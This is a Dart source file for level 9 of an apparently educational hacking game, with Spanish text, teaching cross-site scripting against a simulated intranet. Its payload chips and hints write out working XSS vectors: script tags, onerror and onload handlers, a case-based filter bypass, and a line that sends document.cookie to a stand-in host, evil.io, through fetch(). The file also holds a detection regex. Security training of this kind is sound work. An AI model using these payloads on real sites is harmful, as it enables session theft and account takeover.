/// nivel09_game.dart
/// Lógica pura del Nivel 9 — XSS Attack.
/// No depende de Flame ni de Flutter UI, solo de Dart.
library;

// ── MODELO DE STEP ────────────────────────────────────────────────────────────

/// Representa un objetivo individual del nivel.
class StepXSS {
  final int id;
  final String nombre;
  final int pts;
  final int chipIndex; // índice del chip correcto en la lista de chips
  final String url;
  final String breadcrumb;
  final String hint;       // descripción del objetivo (puede contener HTML simple)
  final String teoria;     // contexto técnico educativo
  final String okTitulo;
  final String okExplicacion;
  final String failTitulo;
  final String failExplicacion;
  final bool Function(String) validar; // función de validación del payload

  const StepXSS({
    required this.id,
    required this.nombre,
    required this.pts,
    required this.chipIndex,
    required this.url,
    required this.breadcrumb,
    required this.hint,
    required this.teoria,
    required this.okTitulo,
    required this.okExplicacion,
    required this.failTitulo,
    required this.failExplicacion,
    required this.validar,
  });
}

/// Representa un chip del arsenal.
class ChipXSS {
  final String etiqueta;
  final String codigo;

  const ChipXSS({required this.etiqueta, required this.codigo});
}

/// Comentario del foro del portal simulado.
class ComentarioForo {
  final String autor;
  final String avatarLetras;
  final String avatarTipo; // 'sys' | 'adm' | 'usr' | 'hack'
  final String texto;
  final String hora;

  ComentarioForo({
    required this.autor,
    required this.avatarLetras,
    required this.avatarTipo,
    required this.texto,
    required this.hora,
  });

  /// Devuelve true si el texto contiene código XSS inyectado.
  bool get tieneXss =>
      RegExp(r'<script|onerror|onload|fetch', caseSensitive: false)
          .hasMatch(texto);
}

// ── RESULTADO DE INTENTO ──────────────────────────────────────────────────────

class ResultadoIntento {
  final bool correcto;
  final String titulo;
  final String explicacion;

  const ResultadoIntento({
    required this.correcto,
    required this.titulo,
    required this.explicacion,
  });
}

// ── JUEGO NIVEL 09 ────────────────────────────────────────────────────────────

class Nivel09Game {
  // ── Estado ──────────────────────────────────────────────────────────────────
  int stepActual = 0;
  int puntos = 0;
  int vidas = 3;
  bool esperandoSiguiente = false; // true tras acierto, hasta pulsar "Siguiente"
  ResultadoIntento? ultimoResultado;
  int _contadorPosts = 0;

  // ── Comentarios del foro ────────────────────────────────────────────────────
  final List<ComentarioForo> comentarios = [
    ComentarioForo(
      autor: r'NT AUTHORITY\SYSTEM',
      avatarLetras: 'SY',
      avatarTipo: 'sys',
      texto:
          'Bienvenido al portal de intranet corporativa SecureNet. Este servicio '
          'es de uso exclusivo para el personal de la empresa. El acceso no '
          'autorizado está prohibido y será registrado.',
      hora: '07:55',
    ),
    ComentarioForo(
      autor: r'CORP\admin',
      avatarLetras: 'AD',
      avatarTipo: 'adm',
      texto:
          'Recordad que este foro es únicamente para uso interno. No compartáis '
          'credenciales de acceso por ningún canal, ni siquiera por correo electrónico.',
      hora: '08:30',
    ),
    ComentarioForo(
      autor: r'CORP\martinez.r',
      avatarLetras: 'MR',
      avatarTipo: 'usr',
      texto:
          'Buenos días a todos. ¿Alguien sabe cuándo van a actualizar el servidor '
          'de ficheros? Lleva dos días respondiendo muy lento y está afectando '
          'al trabajo.',
      hora: '09:12',
    ),
    ComentarioForo(
      autor: r'CORP\soporte.ti',
      avatarLetras: 'ST',
      avatarTipo: 'adm',
      texto:
          'Estamos al tanto del problema con el servidor de ficheros. El equipo '
          'técnico está trabajando en ello y quedará resuelto esta tarde. '
          'Disculpad las molestias.',
      hora: '09:45',
    ),
  ];

  // ── Chips del arsenal ────────────────────────────────────────────────────────
  static const List<ChipXSS> chips = [
    ChipXSS(etiqueta: 'cualquier texto',   codigo: 'hola <mundo>'),
    ChipXSS(etiqueta: 'html básico',       codigo: '<b>hola</b>'),
    ChipXSS(etiqueta: 'script básico',     codigo: '<script>alert(1)</script>'),
    ChipXSS(etiqueta: 'img onerror',       codigo: '<img src=x onerror=alert(1)>'),
    ChipXSS(etiqueta: 'cookie theft',      codigo: '<img src=x onerror=alert(document.cookie)>'),
    ChipXSS(etiqueta: 'SCRIPT mayúsculas', codigo: '<SCRIPT>alert(1)</SCRIPT>'),
    ChipXSS(etiqueta: 'svg onload',        codigo: '<svg onload=alert("XSS")>'),
    ChipXSS(etiqueta: 'fetch + btoa',      codigo: '<img src=x onerror=fetch("https://evil.io?d="+btoa(document.cookie))>'),
  ];

  // ── Steps ────────────────────────────────────────────────────────────────────
  static final List<StepXSS> steps = [
    StepXSS(
      id: 0,
      nombre: 'Reconocimiento',
      pts: 50,
      chipIndex: 0,
      url: 'win-intranet.securenet.local/foro',
      breadcrumb: 'Inicio › Foro › General',
      hint:
          'Objetivo 1/8 — Reconocimiento\n\n'
          'Confirma que el portal no filtra la entrada del usuario. Escribe cualquier '
          'texto con caracteres especiales como < o >. Si el sitio los muestra tal '
          'cual en la página, el portal es vulnerable.',
      teoria:
          '¿Qué es XSS?\n\n'
          'Cross-Site Scripting ocurre cuando una aplicación web incluye datos del '
          'usuario en la página sin escaparlos. El navegador no distingue entre código '
          'del desarrollador y código del atacante: ejecuta todo lo que encuentra en el HTML.',
      validar: (v) => v.trim().isNotEmpty,
      okTitulo: 'Vulnerabilidad confirmada: sin sanitización de salida',
      okExplicacion:
          'El servidor ha incluido tu texto directamente en el HTML de la respuesta '
          'sin convertir los caracteres especiales en entidades seguras. Cualquier '
          'etiqueta HTML que escribas será interpretada por el navegador como código '
          'real. Esta es la condición necesaria para todos los ataques XSS.',
      failTitulo: '',
      failExplicacion: '',
    ),
    StepXSS(
      id: 1,
      nombre: 'Inyección HTML',
      pts: 100,
      chipIndex: 1,
      url: 'win-intranet.securenet.local/foro#nuevo-post',
      breadcrumb: 'Inicio › Foro › Nuevo mensaje',
      hint:
          'Objetivo 2/8 — Inyección HTML\n\n'
          'Antes de usar JavaScript, inyecta HTML puro. Escribe <b>hola</b> y '
          'observa cómo el navegador lo renderiza en negrita en vez de mostrarlo '
          'como texto plano.',
      teoria:
          'HTML injection vs XSS\n\n'
          'La inyección HTML permite modificar la estructura visual de la página. '
          'El XSS va un paso más allá y ejecuta JavaScript. Confirmar que el servidor '
          'renderiza HTML arbitrario es el primer paso para demostrar que el camino '
          'hacia XSS está completamente abierto.',
      validar: (v) => RegExp(r'^<b>', caseSensitive: false).hasMatch(v.trim()),
      okTitulo: 'Inyección HTML confirmada',
      okExplicacion:
          'Tu etiqueta se ha renderizado como HTML real. Si el servidor acepta <b>, '
          'acepta cualquier etiqueta, incluyendo <script>. Esta es la progresión natural '
          'de un ataque XSS: primero HTML, luego JavaScript.',
      failTitulo: 'El payload debe empezar con la etiqueta <b>',
      failExplicacion:
          'Escribe exactamente <b>hola</b>. El chip "html básico" lo inserta '
          'automáticamente. Asegúrate de incluir los símbolos < y > reales, no texto plano.',
    ),
    StepXSS(
      id: 2,
      nombre: 'Reflected XSS',
      pts: 150,
      chipIndex: 2,
      url: 'win-intranet.securenet.local/buscar?q=',
      breadcrumb: 'Inicio › Buscador › Resultados',
      hint:
          'Objetivo 3/8 — Reflected XSS\n\n'
          'El buscador del portal refleja el término en la página sin escaparlo. '
          'Inyecta <script>alert(1)</script>. El navegador ejecutará el código porque '
          'el servidor lo incluye directamente en el HTML.',
      teoria:
          'Reflected XSS\n\n'
          'El payload viaja en la URL como parámetro GET. El servidor lo refleja en '
          'la respuesta HTML sin escaparlo. Solo afecta a quien visita esa URL concreta. '
          'En ataques reales, el atacante envía la URL manipulada a la víctima '
          'por correo o chat.',
      validar: (v) =>
          RegExp(r'<script>', caseSensitive: false).hasMatch(v),
      okTitulo: 'Reflected XSS ejecutado con éxito',
      okExplicacion:
          'El servidor insertó tu etiqueta <script> directamente en el HTML de la '
          'respuesta. El navegador la parseó como código y la ejecutó. En un ataque '
          'real, la URL con el payload se envía a la víctima: con solo abrirla, el '
          'código se ejecuta en su navegador bajo su identidad.',
      failTitulo: 'El payload no contiene la etiqueta <script>',
      failExplicacion:
          'Necesitas escribir <script>alert(1)</script> con la etiqueta de apertura '
          'y de cierre. El chip "script básico" lo inserta automáticamente.',
    ),
    StepXSS(
      id: 3,
      nombre: 'Event handler XSS',
      pts: 150,
      chipIndex: 3,
      url: 'win-intranet.securenet.local/perfil#bio',
      breadcrumb: 'Inicio › Mi perfil › Biografía',
      hint:
          'Objetivo 4/8 — Event handler XSS\n\n'
          'Esta sección bloquea <script>, pero no los atributos de evento. Usa '
          '<img src=x onerror=alert(1)>: la imagen falla al cargar y el evento '
          'onerror ejecuta tu código sin necesidad de etiqueta script.',
      teoria:
          'Event handlers HTML\n\n'
          'Más de 40 atributos HTML pueden ejecutar JavaScript: onerror, onload, '
          'onclick, onmouseover, onfocus. Los filtros que solo bloquean la palabra '
          '"script" son insuficientes porque ignoran todos estos vectores. '
          'El escapado de salida es la única defensa fiable.',
      validar: (v) =>
          RegExp(r'onerror', caseSensitive: false).hasMatch(v) &&
          !RegExp(r'<script>', caseSensitive: false).hasMatch(v),
      okTitulo: 'Vector alternativo explotado: event handler onerror',
      okExplicacion:
          'El atributo onerror ejecuta JavaScript cuando la imagen no puede '
          'cargarse. Como src=x nunca existe, el error es inmediato. Este vector '
          'evita filtros que solo buscan "script". Cualquier filtro que no escape '
          'la salida completa seguirá siendo vulnerable.',
      failTitulo: 'El payload debe usar onerror sin etiqueta script',
      failExplicacion:
          'El formato correcto es <img src=x onerror=alert(1)>. No uses <script> '
          'en este objetivo porque esta sección lo filtra. Usa el chip "img onerror" '
          'del arsenal.',
    ),
    StepXSS(
      id: 4,
      nombre: 'Robo de cookie',
      pts: 200,
      chipIndex: 4,
      url: 'win-intranet.securenet.local/admin/sesion',
      breadcrumb: 'Inicio › Administración › Gestión de sesiones',
      hint:
          'Objetivo 5/8 — Robo de cookie de sesión\n\n'
          'Usa document.cookie dentro de un payload para leer el token de sesión '
          'del administrador. Las cookies sin el flag HttpOnly son completamente '
          'legibles por cualquier script.',
      teoria:
          'Cookies sin HttpOnly\n\n'
          'Las cookies configuradas sin el flag HttpOnly son accesibles desde '
          'JavaScript mediante document.cookie. Este es el vector más común de '
          'secuestro de sesión. La solución es añadir los flags HttpOnly y Secure '
          'a todas las cookies de autenticación en la configuración del servidor IIS.',
      validar: (v) =>
          RegExp(r'document\.cookie', caseSensitive: false).hasMatch(v),
      okTitulo: 'Token de sesión del administrador comprometido',
      okExplicacion:
          'document.cookie ha expuesto el token activo: session=NT_ADMIN_a3f8b2c1. '
          'La cookie estaba disponible porque el servidor no configuró el flag HttpOnly. '
          'En un ataque real, este valor se enviaría con fetch() a un servidor externo '
          'para suplantar al administrador sin conocer su contraseña.',
      failTitulo: 'El payload no accede a document.cookie',
      failExplicacion:
          'Necesitas incluir document.cookie en tu código. '
          'Ejemplo: <img src=x onerror=alert(document.cookie)>. '
          'Usa el chip "cookie theft" del arsenal.',
    ),
    StepXSS(
      id: 5,
      nombre: 'Bypass de filtro',
      pts: 200,
      chipIndex: 5,
      url: 'win-intranet.securenet.local/comentarios#filtrado',
      breadcrumb: 'Inicio › Foro › Sección con filtro',
      hint:
          'Objetivo 6/8 — Bypass de filtro básico\n\n'
          'Esta sección elimina la palabra "script" en minúsculas, pero el filtro '
          'no distingue mayúsculas de minúsculas. Prueba con <SCRIPT>alert(1)</SCRIPT>: '
          'el filtro no lo detecta pero el navegador lo ejecuta igual.',
      teoria:
          'Filtros de lista negra\n\n'
          'Buscan patrones concretos y siempre tienen puntos ciegos. Variaciones de '
          'mayúsculas, codificación URL o etiquetas alternativas los evaden fácilmente. '
          'La única defensa robusta es el escapado de salida en el servidor, que '
          'neutraliza todos los caracteres especiales sin importar su forma.',
      validar: (v) =>
          v.contains('<SCRIPT>') || v.contains('<Script>') || v.contains('<ScRiPt>'),
      okTitulo: 'Filtro evadido mediante cambio de capitalización',
      okExplicacion:
          'El filtro buscaba exactamente la cadena "script" en minúsculas y la '
          'eliminaba. Al escribirlo en mayúsculas, la comparación falla y el filtro '
          'no actúa. El navegador es completamente insensible a mayúsculas en los '
          'nombres de etiquetas HTML, por lo que <SCRIPT> funciona igual que <script>.',
      failTitulo: 'Escribe SCRIPT en mayúsculas para evadir el filtro',
      failExplicacion:
          'Esta sección elimina "script" en minúsculas. Escríbelo en mayúsculas: '
          '<SCRIPT>alert(1)</SCRIPT>. El chip "SCRIPT mayúsculas" lo hace automáticamente.',
    ),
    StepXSS(
      id: 6,
      nombre: 'Stored XSS',
      pts: 250,
      chipIndex: 6,
      url: 'win-intranet.securenet.local/tablon-anuncios',
      breadcrumb: 'Inicio › Tablón de anuncios › Publicar',
      hint:
          'Objetivo 7/8 — Stored XSS persistente\n\n'
          'A diferencia del Reflected XSS, este payload quedará guardado en la base '
          'de datos. Usa <svg onload=alert("XSS")>: el evento onload se dispara al '
          'renderizarse, afectando a todos los empleados que abran el tablón.',
      teoria:
          'Stored XSS\n\n'
          'El payload se guarda en la base de datos y se sirve a todos los visitantes '
          'futuros. No requiere que la víctima reciba una URL manipulada: basta con '
          'que visite la página. Es el tipo más grave de XSS porque puede comprometer '
          'a cientos de usuarios con un único payload publicado.',
      validar: (v) =>
          RegExp(r'onload', caseSensitive: false).hasMatch(v) &&
          RegExp(r'svg', caseSensitive: false).hasMatch(v),
      okTitulo: 'XSS almacenado en la base de datos del servidor',
      okExplicacion:
          'Tu payload está ahora guardado en la base de datos y forma parte del HTML '
          'que el servidor sirve a cualquier visitante. El evento onload del SVG se '
          'dispara automáticamente al renderizar la página. El administrador ejecutará '
          'tu código la próxima vez que abra el tablón, sin hacer nada especial.',
      failTitulo: 'El payload necesita una etiqueta svg con el evento onload',
      failExplicacion:
          'Usa <svg onload=alert("XSS")>. El evento onload del SVG se ejecuta al '
          'renderizarse el elemento. Asegúrate de incluir tanto "svg" como "onload" '
          'en tu payload. El chip "svg onload" lo inserta correctamente.',
    ),
    StepXSS(
      id: 7,
      nombre: 'Exfiltración fetch()',
      pts: 300,
      chipIndex: 7,
      url: 'win-intranet.securenet.local/admin/panel-control',
      breadcrumb: 'Inicio › Administración › Panel de control',
      hint:
          'Objetivo 8/8 — Exfiltración con fetch()\n\n'
          'El objetivo final. Combina document.cookie con fetch() para enviar el '
          'token de sesión a un servidor externo. El payload es:\n'
          '<img src=x onerror=fetch("https://evil.io?d="+btoa(document.cookie))>\n\n'
          'La función btoa() codifica el valor en base64.',
      teoria:
          'Exfiltración con fetch() y btoa()\n\n'
          'fetch() realiza peticiones HTTP desde JavaScript al servidor del atacante. '
          'btoa() codifica en base64 para evitar caracteres problemáticos en la URL. '
          'Combinados con document.cookie, permiten robar tokens de sesión de forma '
          'completamente silenciosa y sin alertas visibles para la víctima.',
      validar: (v) =>
          RegExp(r'fetch', caseSensitive: false).hasMatch(v) &&
          RegExp(r'document\.cookie', caseSensitive: false).hasMatch(v),
      okTitulo: 'Exfiltración completada: token enviado al servidor atacante',
      okExplicacion:
          'Has combinado cuatro técnicas en un solo payload: onerror para ejecutar '
          'código sin etiqueta script, document.cookie para leer el token, fetch() '
          'para enviar los datos a un servidor externo y btoa() para codificarlos. '
          'En un escenario real, el atacante decodificaría el base64 recibido y '
          'usaría el token para iniciar sesión como administrador sin conocer '
          'ninguna contraseña.',
      failTitulo: 'El payload debe contener fetch() y document.cookie a la vez',
      failExplicacion:
          'Necesitas ambas funciones en el mismo payload: '
          '<img src=x onerror=fetch("https://evil.io?d="+btoa(document.cookie))>. '
          'El chip "fetch + btoa" lo inserta automáticamente.',
    ),
  ];

  // ── Chips completados ────────────────────────────────────────────────────────
  final Set<int> chipsCompletados = {};

  // ── Getters de estado ────────────────────────────────────────────────────────
  bool get nivelCompletado => stepActual >= steps.length;
  bool get juegoTerminado => vidas <= 0;
  StepXSS? get stepCurrent =>
      stepActual < steps.length ? steps[stepActual] : null;

  // ── Lógica principal: publicar comentario ────────────────────────────────────
  /// Llama esto cuando el usuario pulsa "Publicar".
  /// Devuelve el resultado del intento.
  ResultadoIntento publicarComentario(String texto) {
    if (esperandoSiguiente || nivelCompletado || juegoTerminado) {
      return const ResultadoIntento(
        correcto: false,
        titulo: 'Acción no permitida',
        explicacion: 'Pulsa "Siguiente objetivo" para continuar.',
      );
    }

    final cur = steps[stepActual];
    _contadorPosts++;
    final hora = _horaActual();

    // Añadir el comentario al foro siempre
    comentarios.add(ComentarioForo(
      autor: 'DESKTOP-XSS\\Agente_${_contadorPosts.toString().padLeft(3, '0')}',
      avatarLetras: 'AG',
      avatarTipo: 'hack',
      texto: texto,
      hora: hora,
    ));

    final esValido = cur.validar(texto);

    if (esValido) {
      puntos += cur.pts;
      chipsCompletados.add(cur.chipIndex);
      stepActual++;
      esperandoSiguiente = !nivelCompletado; // si no es el último, esperar
      ultimoResultado = ResultadoIntento(
        correcto: true,
        titulo: cur.okTitulo,
        explicacion: cur.okExplicacion,
      );
    } else {
      vidas--;
      esperandoSiguiente = false;
      ultimoResultado = ResultadoIntento(
        correcto: false,
        titulo: cur.failTitulo,
        explicacion: cur.failExplicacion,
      );
    }

    return ultimoResultado!;
  }

  /// Avanza al siguiente objetivo. Llama esto cuando el usuario pulsa
  /// el botón "Siguiente objetivo".
  void avanzarSiguiente() {
    esperandoSiguiente = false;
    ultimoResultado = null;
  }

  String _horaActual() {
    final now = DateTime.now();
    return '${now.hour}:${now.minute.toString().padLeft(2, '0')}';
  }
}